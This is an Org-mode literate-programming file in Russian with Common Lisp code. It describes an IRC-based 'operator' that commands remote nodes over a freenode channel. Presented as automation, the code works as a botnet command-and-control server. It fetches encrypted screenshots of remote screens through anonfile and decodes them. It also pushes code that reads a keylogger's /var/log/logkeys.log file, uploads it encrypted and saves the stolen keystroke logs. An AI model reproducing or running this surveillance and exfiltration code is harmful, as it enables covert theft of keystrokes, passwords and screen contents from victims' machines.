Наблюдать за узлом сети и отправлять команды очень увлекательно, но хочется добавить автоматизации. Например, если глупый робот-пылесос умеет посылать в канал сообщение о том, что батарея разряжается, то умная программа-оператор, сидящая в irc-канале может начать с ним диалог, чтобы довести его до зарядной станции.

Для этого оператору нужно только уметь принимать сообщения и декодировать отправленные данные. Общая схема работы будет такая же как у супервизора: используем ~operator-loop~ и ~watchdog-timer~, чтобы циклически вызывать функцию из глобальной переменной ~*operator*~.

Каждую секунду ~operator-loop~ инкрементирует состояние переменной ~watchdog-timer~ и вызывает ~operator~. Внутри себя ~operator~ использует значение этой переменной, чтобы отслеживать зависшие потоки и завершать их.

#+NAME: operator_loop
#+BEGIN_SRC lisp :noweb yes
  <<debug>>

  (defparameter *watchdog-timer* 0)

  (defparameter *operator-stop-flag* nil)

  (defparameter *sleep-interval* 3)

  <<operator>>

  (defun operator-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *operator-stop-flag*
         (go end))
       (dbg "~%:: operator-loop WGD=~3,'OD~%" *watchdog-timer*)
       (funcall *operator*)
       (sleep *sleep-interval*)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (operator-loop)
#+END_SRC

** Operator

Оператор работает с потоками ~op-irc-th~, задача которых - обрабатывать сообщения, которые приходят из IRC-канала. Эти потоки могут зависнуть попав в необработанную ошибку или при сбое сети, поэтому оператор должен минимизировать ущерб от таких зависаний. В норме мы считаем, что должен работать один поток ~op-irc-th~.

Вторая задача оператора - осуществлять управление потоками, которые выполняют задачи. Эти задачи возникают, когда из IRC-канала приходят сообщения. В общем случае в для обработки каждого сообщения может создаваться свой поток, при этом в силу (возможно) нестабильной работы сети, часть из этих потоков может зависать. Это не должно сказываться на роботоспособности всей программы.

Оператору для работы потребуются вспомогательные функции, которые:
- ищут потоки по их именам
- завершают поток
- очищают список потоков от тех, что уже завершены

Поэтому мы можем определить рамочную функцию здесь, а куски кода, которые выполняют логику работы с разными типами потоков доопределить ниже в этом же разделе.

#+NAME: operator
#+BEGIN_SRC lisp :noweb yes
  (defparameter *watchdog-timer-max* 100)

  (defparameter *task-th-stop-flag* nil)

  (defparameter *op-irc-th-stop-flag* nil)

  (defparameter *op-connection-established-flag* nil)

  (defparameter *op-irc-threads* nil)

  (defparameter *max-task-thread-cnt* 30)

  (defparameter *task-threads* nil)

  (defparameter *max-task-thread-life-time* 5)

  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  <<queues>>

  <<op_irc>>

  <<task_function>>

  (defparameter *operator*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (handler-case (bt:destroy-thread th)
                               ;; happens, when thread destroyed already
                               (TYPE-ERROR () nil)
                               (SB-THREAD:INTERRUPT-THREAD-ERROR () nil)))
                 (kill-op-irc (th)
                   (kill th)
                   (setf *watchdog-timer* 0)
                   (setf *op-connection-established-flag* nil))
                 (clear ()
                   (bt:with-recursive-lock-held (*thread-operations-lock*)
                     (setf *task-threads*
                           (remove-if-not #'(lambda (pair)
                                              (bt:thread-alive-p (car pair)))
                                          ,*task-threads*)))))
          <<op_irc_th_management>>
          <<tasks_th_management>>
          ))))
#+END_SRC

*** op-irc-th management

Если отсутствуют потоки ~op-irc-th~ оператор будет пытаться создать один, и реинициализировать ~watchdog-timer~.

Если хотя бы один поток ~op-irc-th~ существует, но значение ~watchdog-timer~ слишком велико - он будет убит, потому что, вероятно, он завис. Ведь независший поток сбрасывал бы ~watchdog-timer~ каждый раз выполняя какую-либо операцию, например, получая сообщение.

Если значение ~watchdog-timer~ продолжает оставаться слишком большим, т.е. никакой из зависший потоков не подал признаки жизни, то при следующем запуске ~operator~ будет убит следующий поток.

И так далее, пока потоков ~op-irc-th~ не останется (или один из оживших потоков ~op-irc-th~ не обнулит таймер - например при приходе сообщения).

Когда все потоки будут уничтожены оператор будет пытаться создавать новые, сводя задачу к известной.

Так мы обеспечиваем попытки перезапуска, уничтожая все потоки когда ~watchdog-timer~ перестает обновляться и избегая ситуации, когда в канале одновременно больше одного независшего потока.

#+NAME: op_irc_th_management
#+BEGIN_SRC lisp :noweb yes
  ;; if there is no irs-thread then start it
  (when (and (null (fnd "op-irc-th"))       ;; no op-irc-th
             (null *op-irc-th-stop-flag*))  ;; no op-irc-th stop flag
    (dbg ":: operator lambda: start irc-th~%")
    (setf *watchdog-timer* 0)
    (bt:make-thread
     #'op-irc :name "op-irc-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*op-irc-thread-stop-flag* . ,*op-irc-th-stop-flag*))))
  ;; if there is irc-thread, but the watchdog-timer exceeds
  ;; or the flag is set - then kill it.
  (awhen (fnd "op-irc-th")
    (when (> *watchdog-timer*  *watchdog-timer-max*)
      (dbg ":: operator-lambda: kill op-irc-th by WDG~%")
      (kill-op-irc it))
    (when *op-irc-th-stop-flag*
      (dbg ":: operator-lambda: kill op-irc-th by FLAG~%")
      (kill-op-irc it)))
#+END_SRC

*** Task's threads management

Мы получаем задачи из очереди, которая будет определена в одном из разделов ниже. В первую очередь, необходимо следить, чтобы количество рабочих потоков не было слишком большим, убивая потоки, которые дольше всех работают. Мы считаем, что никакой поток не должен работать более ~max-task-thread-life-time~ секунд. Если он работает дольше - мы можем это позволить только если система не перегружена, т.е. общее количество потоков меньше ~max-task-thread-cnt~.

#+NAME: kill_slow_task_threads
#+BEGIN_SRC lisp :noweb yes
  (when (> (length *task-threads*) *max-task-thread-cnt*)
    (dbg ":: operator-lambda: many task threads~%")
    (loop :for (task-th . time) :in *task-threads* :do
         (dbg ":: operator-lambda-killer ~A . ~A~%" task-th time)
         (when (> (- (get-universal-time) time)
                  ,*max-task-thread-life-time*)
           (dbg ":: operator-lambda: kill task-th by lifetime exceed~%")
           (kill task-th)))
    (clear))
#+END_SRC

Кроме того, по идее, необходимо следить, [TODO:gmm] чтобы очередь не переполнялась, но я пока не решил, как именно лучше делать - прекратить ли принимать новые задачи или удалять старые: по идее все приходящие задачи для нас одинаково важны.

Переходим к выполнению задач.

Если очередь не пуста, то было бы неплохо вынуть из нее несколько задач и для каждой из них запустить поток. [TODO:gmm] Но пока я запускаю по одной задаче на итерацию.

#+NAME: start_task_thread
#+BEGIN_SRC lisp :noweb yes
  (when (< 0 (length-of-queue))
    (let* ((current-task (pop-task))
           (bindings `((*standard-output* . ,*standard-output*)
                       (*task-thread-stop-flag* . ,*task-th-stop-flag*)
                       (*current-task* . ,current-task)
                       (*op-sess* . ,*op-sess*)
                       (*op-user* . ,*op-user*)
                       (*op-serv* . ,*op-serv*)
                       (*op-chan* . ,*op-chan*)
                       (*op-lock* . ,*op-lock*)
                       (*op-conn* . ,*op-conn*)
                       (*watchdog-timer* . ,*watchdog-timer*))))
      (bt:with-recursive-lock-held (*thread-operations-lock*)
        (push (cons (bt:make-thread #'task :name "task-th"
                                    :initial-bindings bindings)
                    (get-universal-time))
              ,*task-threads*))))
#+END_SRC

Собственно функция ~TASK~, которая выполняет задачу, будет описана в соответствуюшщем разделе.

Собираем все вместе:

#+NAME: tasks_th_management
#+BEGIN_SRC lisp :noweb yes
  <<kill_slow_task_threads>>
  <<start_task_thread>>
#+END_SRC

** Operator's Irc Thread Function

Когда оператор создает новый поток в качестве функции потока он указывает ~op-irc~. Задачи этой функции:
- создать соединение с IRC-сервером
- обнулить ~watchdog-timer~
- запустить ~op-loop~ для обработки сообщений IRC

Если нет подключения к сети мы получим ошибку ~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но записана в лог, как и любые другие ошибки подключения. В этих случаях функция ~op-loop~ не будет вызвана, произойдет выход их функции потока и поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит его и это приведет к следующей попытке подключения.

#+NAME: op_irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *op-sess* nil)
  (defparameter *op-user* nil)
  (defparameter *op-serv* "irc.freenode.org")
  (defparameter *op-chan* "#<<get_irc_channel_name()>>")
  (defparameter *op-lock* (bt:make-recursive-lock "op-lock"))
  (defparameter *op-conn* nil)

  <<op_loop>>

  (defun op-irc ()
    "operator's irc thread func"
    (setf *op-sess* (get-universal-time))
    (setf *op-user* (format nil "op~A" *op-sess*))
    (setf *op-conn*
          (handler-case
              (cl-irc:connect :nickname *op-user* :server *op-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *op-conn*
      (dbg "::op irc conn:~A~%" *op-conn*)
      (setf *watchdog-timer* 0)
      (op-loop)))
#+END_SRC

** Operator's Loop

На этом месте текущий поток должен запустить поток-помошник, который инжектирует хук, подключитья к каналу и установит ~op-connection-established-flag~.

Запустив этот поток, можно сразу же зациклиться читая сообщения - дальше будут работать установленные хуки. Они будут вызываться в контексте текущего потока, асинхронно, из функции пакета ~cl-irc~.

#+NAME: op_loop
#+BEGIN_SRC lisp :noweb yes
  <<op_helper>>

  (defun op-loop ()
    (bt:make-thread
     #'op-helper :name "op-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*op-sess* . ,*op-sess*)
       (*op-user* . ,*op-user*)
       (*op-serv* . ,*op-serv*)
       (*op-chan* . ,*op-chan*)
       (*op-lock* . ,*op-lock*)
       (*op-conn* . ,*op-conn*)))
    (handler-case (cl-irc:read-message-loop *op-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg ":: op-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::op-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

*** Operator's helper thread

Поток-помошник занимается только тем, что устанавливает хук, джоинится в канал и отправляет приветственное сообщение о том что он в канале.

#+NAME: op_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-recursive-lock-held (*op-lock*)
       (cl-irc:privmsg *op-conn* *op-chan* (format nil ,msg ,@params))))

  ;; op-hook
  <<op_hook>>

  (defun op-helper ()
    (sleep 1)
    (cl-irc:add-hook *op-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'op-msg-hook)
    (sleep 1)
    (bt:with-recursive-lock-held (*op-lock*)
      (cl-irc:join *op-conn* *op-chan*))
    (sleep 1)
    (bt:with-recursive-lock-held (*op-lock*)
      (setf *op-connection-established-flag* t))
    (sendmsg "op here"))
#+END_SRC

** Operator's Message Hook

Собственно хук, который обрабатывает приходящие в канал сообщения. Он вынесен в глобальную переменную для удобства замены на лету.

Чтобы предотвратить последующую обработку процедура хука должна возвращать T.

#+NAME: op_hook
#+BEGIN_SRC lisp :noweb yes
  ;; op_cmd_proc
  <<op_cmd_proc>>

  (defun op-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *op-cmd* param)
    t)
#+END_SRC

** Rule-based Command Processor

Ну вот, теперь осталось правильно реагировать на команды. Чтобы распознать команду мы будем применять диспетчер, работающий как система правил. Он опирается на список правил, каждая из которых представляет пару (условие . действие).

Правила должны иметь возможность делать что-то асинхронно, для этого мы подключаем механизм очередей.

#+NAME: op_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  <<shot_rule>>
  <<hi_rule>>
  <<k_rule>>

  (defparameter *op-rules*
    (list (cons #'shot-rule-antecedent  #'shot-rule-consequent)
          (cons #'hi-rule-antecedent    #'hi-rule-consequent)
          (cons #'k-rule-antecedent     #'k-rule-consequent)))

  (defparameter *op-cmd*
    (lambda (param)
      (block op-cmd-block
        (let* ((msg  (cadr (CL-IRC:ARGUMENTS param)))
               (src  (CL-IRC:SOURCE param))
               ;; (oct  (decrypt msg *op-sess*))
               ;; (str  (handler-case
               ;;           (flex:octets-to-string oct :external-format :utf-8)
               ;;         (FLEXI-STREAMS:EXTERNAL-FORMAT-ENCODING-ERROR () nil)))
               (str msg)
               )
          (dbg ":: op-cmd ~A: ~A~%" src str)
          (block op-rules-dispatcher
            (let ((applyed_rules 0))
              (loop :for (antecedent . consequent) :in *op-rules* :do
                   (when (funcall antecedent str src)
                     (incf applyed_rules)
                     (dbg ":: op-cmd rule: ~A~%" consequent)
                     (when (funcall consequent str src)
                       (return-from op-rules-dispatcher nil))))
              (when (> 0 applyed_rules)
                (dbg "::UNKMSG [~A] from [~A]~%" str src))
              (finish-output)))
          ))))
#+END_SRC

** Shot Rule

Правило для скриншотов просто проверяет сообщение на соответствие регулярному выражению. Если есть совпадение - мы должны как минимум скачать и сохранить данные.

Однако, скачивание может наткнуться на сбой сети и зависнуть, и в этом случае хук никогда не завершиться и соответственно зависнет цикл чтения IRC-сообщений, потому что хук выполняется в его контексте. Поэтому вместо того, чтобы начать скачивание и обработку - мы делаем отложенную задачу и помещаем её в очередь.

#+NAME: shot_rule
#+BEGIN_SRC lisp :noweb yes
  (defun shot-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^/.*/[0-9]*(_[0-9])?$" str))

  (defun shot-rule-consequent (str src)
    (dbg ":: shot-rule-consequent (~A) ~A: ~A~%"
         (length-of-queue) src str)
    (ins-task (make-task :class 'task
                         :data (list str src)
                         :code #'identity)))

  ;; (shot-rule-consequent "/pe3bM7E9n5/3785062633" "b3785062627")
#+END_SRC

** Queues

Когда мы скачиваем файл с файлообменника - это может окончиться неудачей. В этом случае удобно обрабатывать такие сбои в CPS-стиле, особенно когда мы хотим запускать скачку паралельно, в несколько потоков.

Чтобы отвязать запуск потоков от системы правил мы будем использовать очередь, в которую будем добавлять задания на обработку. Преимуществом такого подхода может быть возможность ссылаться на ранее выполнявшиеся задания.

Структуру задания определим так:

#+NAME: task
#+BEGIN_SRC lisp
  (defstruct task
    class
    data
    code)
#+END_SRC

Для обслуживания очереди нам понадобится сама очередь и блокировка на ней:

#+NAME: task_queue
#+BEGIN_SRC lisp
  (defparameter *task-queue* nil)
  (defparameter *task-queue-lock* (bt:make-lock "task-queue-lock"))
#+END_SRC

Теперь можно добавить операции для добавления и удаления из очереди заданий.

#+NAME: task_queue_ops
#+BEGIN_SRC lisp
  (defun ins-task (task)
    (bt:with-lock-held (*task-queue-lock*)
      (setf *task-queue*
            (append *task-queue*
                    (list task)))))

  (defun pop-task ()
    (bt:with-lock-held (*task-queue-lock*)
      (pop *task-queue*)))

  (defun length-of-queue ()
    (bt:with-lock-held (*task-queue-lock*)
      (length *task-queue*)))
#+END_SRC

Теперь соединим все вместе

[TODO:gmm] Надо еще добавить менеджер очередей в отдельном потоке, который разбирает и выполняет задачи.

#+NAME: queues
#+BEGIN_SRC lisp :noweb yes
  <<task>>
  <<task_queue>>
  <<task_queue_ops>>
#+END_SRC

** Task Function

Эта функция вызывается каждый раз, когда нужно обработать задачу из очереди. Она получает задачу в переменной ~current-task~.

Сейчас ей остается только вызвать ~shot-downloader~, передав ему параметры из задачи.

#+NAME: task_function
#+BEGIN_SRC lisp :noweb yes
  <<shot_downloader>>

  (defun task ()
    (destructuring-bind (str src)
        (task-data *current-task*)
      ;; (dbg ":: TF (~A): ~A: ~A~%" (length-of-queue) src str)
      (shot-downloader str src)))
#+END_SRC

** Shot Downloader

Однако, необходимо описать операцию, которая будет вызываться из таска и выполнять всю грязную работу.

#+NAME: shot_downloader
#+BEGIN_SRC lisp :noweb yes
  ;; anon_file_download
  <<anon_file_download>>

  ;; seq_xor
  <<seq_xor>>

  ;; decrypt
  <<decrypt>>

  ;; unpack_img
  <<unpack_img>>

  (defun shot-downloader (str src)
    (let* ((key (parse-integer (subseq src 1)))
           (enc (anon-file-download str))
           (dec (decrypt enc key))
           (png (let ((png-read::*png-file* "fake-file"))
                  (flex:with-input-from-sequence (stream dec)
                    (png-read:read-png-datastream stream))))
           (image-data (png-read:image-data png))
           ;; reverse
           (dims   (subseq (array-dimensions image-data) 0 2))
           (height (cadr dims))
           (width  (car  dims))
           (image ;; меняем размерности X и Y местами
            (let ((result (make-array (list height width)
                                      :element-type '(unsigned-byte 8))))
              (do ((y 0 (incf y)))
                  ((= y height))
                (do ((x 0 (incf x)))
                    ((= x width))
                  (setf (aref result y x)
                        (aref image-data x y))))
              result))
           ;; (dif (ppcre:scan-to-strings "/(.*)/([0-9]*)_([0-9]*)" str))
           ;; (img (if (not dif)
           ;;          (setf prev image)
           ;;          ;; else
           ;;          (setf prev (get-img-diff dims prev image))))
           (img image)
           ;; unpacking
           (unpack (unpack-img img))
           (unpack-dims (array-dimensions unpack))
           (new-width (cadr unpack-dims))
           (fname-str (multiple-value-bind (match-p result)
                          (ppcre:scan-to-strings "/.*/(.*)" str)
                        (elt result 0))))
      (let* ((png (make-instance 'zpng:png
                                 :width new-width
                                 :height height
                                 :color-type :grayscale))
             (vector (make-array ;; displaced vector - need copy for save
                      (* height new-width (zpng:samples-per-pixel png))
                      :displaced-to unpack :element-type '(unsigned-byte 8))))
        ;; Тут применен потенциально опасный трюк, когда мы создаем
        ;; объект PNG без данных, а потом добавляем в него данные,
        ;; используя неэкспортируемый writer.
        ;; Это нужно чтобы получить третью размерность массива,
        ;; который мы хотим передать как данные и при этом
        ;; избежать создания для этого временного объекта
        (setf (zpng::%image-data png) (copy-seq vector))
        (zpng:write-png png (format nil "~~/<<get_dest_path()>>/~A" fname-str)))
      t))
#+END_SRC

** Anon File Download

#+NAME: anon_file_download
#+BEGIN_SRC lisp :noweb yes
  (defparameter *user-agent* "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0")

  (defparameter *additional-headers*
    `(("Accept" . "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
      ("Accept-Language" . "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3")
      ("Accept-Charset" . "utf-8")))

  (defun get-download-link (text)
    (loop :for str :in (split-sequence:split-sequence #\Newline text)
       :do (multiple-value-bind (match-p result)
               (ppcre:scan-to-strings
                "(https://cdn-([0-9]*)\.anonfile.com\/(.*))\\\""
                str)
             (when match-p (return (aref result 0))))))

  (defun anon-file-download (filename)
    (let ((cookie-jar (make-instance 'drakma:cookie-jar)))
      ;; load mainpage for cookies, headers and csrf
      (multiple-value-bind (body-or-stream ;; status-code headers uri
                            ;;stream must-close reason-phrase
                            )
          (drakma:http-request (format nil "https://anonfile.com~A" filename)
                               :user-agent *user-agent*
                               :redirect 10
                               :force-binary t
                               :cookie-jar cookie-jar
                               :additional-headers *additional-headers*)
        (let* ((text (flex:octets-to-string body-or-stream :external-format :utf-8))
               (link (get-download-link text)))
          (multiple-value-bind (body-or-stream ;; status-code headers uri
                                ;;stream must-close reason-phrase
                                )
              (drakma:http-request link
               :user-agent *user-agent*
               :cookie-jar cookie-jar
               :additional-headers *additional-headers*
               :force-binary t)
            (flex:octets-to-string body-or-stream :external-format :utf-8))))))
#+END_SRC

** Unpack image

#+NAME: unpack_img
#+BEGIN_SRC lisp
  (defun unpack-img (image)
    (declare (optimize (speed 3) (safety 0)))
    (let* ((dims (array-dimensions image))
           (height (car dims))
           (width (cadr dims))
           (new-width (ash width 3))
           (result (make-array (list height new-width)
                               :element-type '(unsigned-byte 8))))
      (declare (type fixnum width)
               (type fixnum new-width)
               (type fixnum height))
      (do ((qy 0 (incf qy)))
          ((= qy height))
        (declare (type fixnum qy))
        (do ((qx 0 (incf qx)))
            ((= qx width))
          (declare (type fixnum qx))
          (let ((acc (aref image qy qx)))
            (declare (type (unsigned-byte 8) acc))
            ;; (format t "~8,'0B" acc)
            (do ((out 0 (incf out))
                 (in  7 (decf in)))
                ((= 8 out))
              (declare (type fixnum out in))
              (unless (= 0 (logand acc (ash 1 in)))
                (setf (aref result qy (logior (ash qx 3) out))
                      255)))))
        ;; (format t "~%")
        )
      result))

  ;; TEST
  ;; (print
  ;;  (unpack-img
  ;;   (pack-img
  ;;    (x-snapshot :width 31 :height 23))))

  ;; TEST
  ;; (time
  ;;  (let* ((image  (load-png "FILE1088"))
  ;;         (unpack (unpack-img image))
  ;;         (dims (array-dimensions unpack)))
  ;;    (save-png (cadr dims)
  ;;              (car dims)
  ;;              (format nil "~A" (gensym "FILE"))
  ;;              unpack
  ;;              :grayscale)))
#+END_SRC

** Hi Rule

Правило "ответить на приветствие" совпадает с приветственным сообщением. Чтобы оно было чуть сложнее чем просто посылка сообщения, мы можем попытаться загрузить какой-нибудь файл с удаленного узла

#+NAME: hi_rule
#+BEGIN_SRC lisp :noweb yes
  (defun hi-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^hi$" str))

  <<upload_code_and_send>>

  (defun hi-rule-consequent (str src)
    (dbg ":: HI-rule-consequent (~A) ~A: ~A~%"
         (length-of-queue) src str)
    (let* ((tmpkey 1234567890)
           (receiver (parse-integer (subseq src 1)))
           (code (format
                  nil
                  "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
                  tmpkey)))
      (upload-code-and-send code tmpkey receiver)))

  ;; (let* ((tmpkey 1234567890)
  ;;        (src "b3785294860")
  ;;        (receiver (parse-integer (subseq src 1)))
  ;;        (code (format
  ;;               nil
  ;;               "(progn (sendmsg (format nil \"k~~A\" (upload-code (alexandria:read-file-into-string \"/var/log/logkeys.log\") ~A))) t)"
  ;;               tmpkey)))
  ;;   (upload-code-and-send code tmpkey receiver))
#+END_SRC

** K Rule

#+NAME: k_rule
#+BEGIN_SRC lisp :noweb yes
  (defun k-rule-antecedent (str src)
    (declare (ignore src))
    (ppcre:scan-to-strings "^k/(.*)/u-(.*)$" str))

  <<download_and_decrypt>>

  (defun k-rule-consequent (str src)
    (dbg ":: K-rule-consequent (~A) ~A: ~A~%"
         (length-of-queue) src str)
    (let* ((tmpkey 1234567890))
      (alexandria:write-string-into-file
       (download-and-decrypt (subseq str 1) tmpkey)
       (format nil "~~/<<get_dest_path()>>/~A.log" (ppcre:regex-replace-all "/" str "_")))))
#+END_SRC

* Utils

#+NAME: debug
#+BEGIN_SRC lisp
  (defun decode-time (universal-time)
    (multiple-value-bind (second minute hour date month year day daylight-p zone)
        (decode-universal-time universal-time)
      (format nil "~A-~A-~A ~A:~A:~A" year month date hour minute second)))
#+END_SRC

* Old

#+NAME:
#+BEGIN_SRC lisp
  <<anon_file_upload>>
  <<unpack_img>>

  (defun save-png (width height pathname-str image
                   &optional (color-type :truecolor-alpha))
    (let* ((png (make-instance 'zpng:png :width width :height height
                               :color-type color-type))
           (vector (make-array ;; displaced vector - need copy for save
                    (* height width (zpng:samples-per-pixel png))
                    :displaced-to image :element-type '(unsigned-byte 8))))
      ;; Тут применен потенциально опасный трюк, когда мы создаем
      ;; объект PNG без данных, а потом добавляем в него данные,
      ;; используя неэкспортируемый writer.
      ;; Это нужно чтобы получить третью размерность массива,
      ;; который мы хотим передать как данные и при этом
      ;; избежать создания для этого временного объекта
      (setf (zpng::%image-data png) (copy-seq vector))
      (zpng:write-png png pathname-str)))

#+END_SRC

** Save and Load

Для целей отладки нам нужно уметь сохранять и загружать png-изображения

#+NAME: save_and_load_png
#+BEGIN_SRC lisp
  ;; DEPRECATED, use explicit saving png-sequence by with-open-file
  ;; (defun save-png (pathname-str png)
  ;;   (zpng:write-png png pathname-str))

  (defun load-png (pathname-str)
    "Возвращает массив size-X столбцов по size-Y точек,
       где столбцы идут слева-направо, а точки в них - сверху-вниз
       ----
       В zpng есть указание на возможные варианты COLOR:
       ----
             (defmethod samples-per-pixel (png)
               (ecase (color-type png)
                 (:grayscale 1)
                 (:truecolor 3)
                 (:indexed-color 1) ;; НЕ ПОДДЕРЖИВАЕТСЯ
                 (:grayscale-alpha 2)
                 (:truecolor-alpha 4)))
      "
    (let* ((png (png-read:read-png-file pathname-str))
           (image-data (png-read:image-data png))
           (color (png-read:colour-type png))
           (dims (cond ((or (equal color :truecolor-alpha)
                            (equal color :truecolor))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)
                              (array-dimension image-data 2)))
                       ((or (equal color :grayscale)
                            (equal color :greyscale))
                        (list (array-dimension image-data 1)
                              (array-dimension image-data 0)))
                       (t (error 'unk-png-color-type :color color))))
           (result ;; меняем размерности X и Y местами
            (make-array dims :element-type '(unsigned-byte 8))))
      ;; (dbg "~% new-arr ~A "(array-dimensions result))
      ;; ширина, высота, цвет => высота, ширина, цвет
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension result 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension result 1)))
                        ,@body))))
        (cond ((or (equal color :truecolor-alpha)
                   (equal color :truecolor))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension result 2)))
                        (setf (aref result y x z)
                              (aref image-data x y z)))))
              ((or (equal color :grayscale)
                   (equal color :greyscale))
               (cycle (setf (aref result y x)
                            (aref image-data x y))))
              (t (error 'unk-png-color-type :color color)))
        result)))
#+END_SRC

** Bit-vector operations

Для целей отладки определим операции кодирования в битовый вектор и обратно

#+NAME: bit_vector
#+BEGIN_SRC lisp
  (defun bit-vector->integer (bit-vector)
    "Create a positive integer from a bit-vector."
    (reduce #'(lambda (first-bit second-bit)
                (+ (* first-bit 2) second-bit))
            bit-vector))

  (defun integer->bit-vector (integer)
    "Create a bit-vector from a positive integer."
    (labels ((integer->bit-list (int &optional accum)
               (cond ((> int 0)
                      (multiple-value-bind (i r) (truncate int 2)
                        (integer->bit-list i (push r accum))))
                     ((null accum) (push 0 accum))
                     (t accum))))
      (coerce (integer->bit-list integer) 'bit-vector)))
#+END_SRC

** Binarization

Получение черно-белого изображения или в градациях серого из полноцветного.

Здесь остается пространство для оптимизаций путем применения SIMD-операций.

#+NAME: binarization
#+BEGIN_SRC lisp
  (defun binarization (image &optional threshold)
    (let* ((dims (array-dimensions image))
           (new-dims (cond ((equal 3 (length dims))  (butlast dims))
                           ((equal 2 (length dims))  dims)
                           (t (error 'binarization-error))))
           (result (make-array new-dims :element-type '(unsigned-byte 8))))
      (macrolet ((cycle (&body body)
                   `(do ((y 0 (incf y)))
                        ((= y (array-dimension image 0)))
                      (do ((x 0 (incf x)))
                          ((= x (array-dimension image 1)))
                        ,@body))))
        (cond ((equal 3 (length dims))
               (cycle (do ((z 0 (incf z)))
                          ((= z (array-dimension image 2)))
                        (let ((avg (floor (+ (aref image y x 0)
                                             (aref image y x 1)
                                             (aref image y x 2))
                                          3)))
                          (when threshold
                            (if (< threshold avg)
                                (setf avg 255)
                                (setf avg 0)))
                          (setf (aref result y x) avg)))))
              ((equal 2 (length dims))
               (cycle (let ((avg (aref image y x)))
                        (when threshold
                          (if (< threshold avg)
                              (setf avg 255)
                              (setf avg 0)))
                        (setf (aref result y x) avg))))
              (t (error 'binarization-error))))
      result))

  ;; TEST: binarize and save screenshot
  ;; (let* ((to   "x-snapshot-binarize.png")
  ;;        (image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;   (destructuring-bind (height width) ;; NB: no depth!
  ;;       (array-dimensions image-data)
  ;;     (save-png width height to image-data :grayscale))) ;; NB: grayscale!


  ;; TEST: binarize get png and save
  ;; (print
  ;;  (let* ((image-data (binarization (x-snapshot) 127))) ;; NEW: threshold!
  ;;    (destructuring-bind (height width) ;; NB: no depth!
  ;;        (array-dimensions image-data)
  ;;      (let ((seq (get-png width height image-data :grayscale)))
  ;;        (with-open-file (file-stream "tee.png"
  ;;                                     :direction :output
  ;;                                     :if-exists :supersede
  ;;                                     :if-does-not-exist :create
  ;;                                     :element-type '(unsigned-byte 8))
  ;;          (write-sequence seq file-stream))))))
#+END_SRC

** Bit-image

Упаковка бинаризованного черно-белого изображения в битовый массив

#+NAME: make_bit_image
#+BEGIN_SRC lisp
  (defun make-bit-image (image-data)
    (destructuring-bind (height width &optional colors)
        (array-dimensions image-data)
      ;; функция может работать только с бинарными изобажениями
      (assert (null colors))
      (let* ((new-width (+ (logior width 7) 1))
             (bit-array (make-array (list height new-width)
                                    :element-type 'bit
                                    :initial-element 1)))
        (do ((qy 0 (incf qy)))
            ((= qy height))
          (do ((qx 0 (incf qx)))
              ((= qx width))
            ;; если цвет пикселя не белый, считаем,
            ;; что это не фон и заносим в битовый массив 1
            (if (equal (aref image-data qy qx) 255)
                (setf (bit bit-array qy qx) 1)
                (setf (bit bit-array qy qx) 0))))
        bit-array)))

  ;; TEST: make-bit-image
  ;; (print
  ;;  (make-bit-image
  ;;   (binarization (x-snapshot :x 0 :y 0 :width 30 :height 30) 127)))
#+END_SRC

* Assembly

#+NAME:
#+BEGIN_SRC lisp :tangle q.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")
  (ql:quickload "ironclad")

  <<supervisor>>
#+END_SRC

#+NAME:
#+BEGIN_SRC lisp :tangle o.lisp :noweb yes
  (ql:quickload "anaphora")
  (use-package :anaphora)
  (ql:quickload "bordeaux-threads")
  (ql:quickload "clx")
  (ql:quickload "zpng")
  (ql:quickload "png-read")
  (ql:quickload "drakma")
  (ql:quickload "cl-ppcre")
  (ql:quickload "cl-base64")
  (ql:quickload "prbs")
  (ql:quickload "cl-irc")
  (ql:quickload "cl-json")
  (ql:quickload "ironclad")

  <<operator_loop>>
#+END_SRC

* Cron

#+BEGIN_SRC lisp
  (sb-posix:get-pid)
